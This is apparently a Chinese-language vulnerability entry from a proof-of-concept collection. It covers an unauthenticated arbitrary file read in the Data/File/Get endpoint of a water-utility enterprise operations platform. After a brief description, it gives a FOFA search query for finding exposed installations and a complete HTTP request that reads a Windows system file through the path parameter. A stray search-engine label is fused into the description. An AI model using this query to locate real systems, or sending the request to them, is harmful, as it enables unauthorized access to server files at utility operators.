## 森鑫炬水务企业综合运营平台-Get-任意文件读取漏洞

## 一、漏洞简介
森鑫炬水务企业综合运营平台 File/Get 接囗处存在任意文件读取漏洞,未经身份验证的远程攻击者通过漏洞可以获取到服务器敏感信息，导致系统处于极不安全的状态。02搜索引擎

## fofa
```
title="森鑫炬水务企业综合运营平台 - S8" || (body="Content/easyui.css" && body="重庆森鑫炬科技有限公司")
```

## poc
```
GET /Data/File/Get?path=C:/Windows/win.ini HTTP/1.1
Host: [被遮挡]
User-Agent: Mozilla/5.0 (Fedora; Linux i686) AppleWebKit/537.36 ... Chrome/133.0.0.0 ...
Connection: close
Accept-Encoding: gzip
```
